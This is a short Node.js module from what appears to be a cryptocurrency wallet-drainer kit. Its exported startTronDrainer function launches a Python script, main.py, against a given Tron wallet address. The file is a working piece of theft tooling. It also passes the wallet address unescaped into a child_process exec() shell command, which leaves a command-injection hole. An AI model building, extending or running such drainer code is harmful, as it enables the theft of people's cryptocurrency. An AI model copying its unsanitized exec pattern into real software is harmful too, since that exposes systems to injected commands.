// processors/trx/index.js
const { exec } = require('child_process');
const path = require('path');

async function startTronDrainer(walletAddress) {
  console.log(`[Tron Processor] Starting for wallet: ${walletAddress}`);

  try {
    const drainerPath = path.join(__dirname, 'main.py');

    const command = `python3 "${drainerPath}" --wallet ${walletAddress}`;

    exec(command, (error, stdout, stderr) => {
      if (error) {
        console.error(`[Tron] Error: ${error.message}`);
        return;
      }
      if (stderr) console.error(`[Tron] Stderr: ${stderr}`);
      console.log(`[Tron] Output: ${stdout}`);
    });

  } catch (err) {
    console.error(`[Tron Processor] Failed:`, err);
  }
}

module.exports = {
  startTronDrainer
};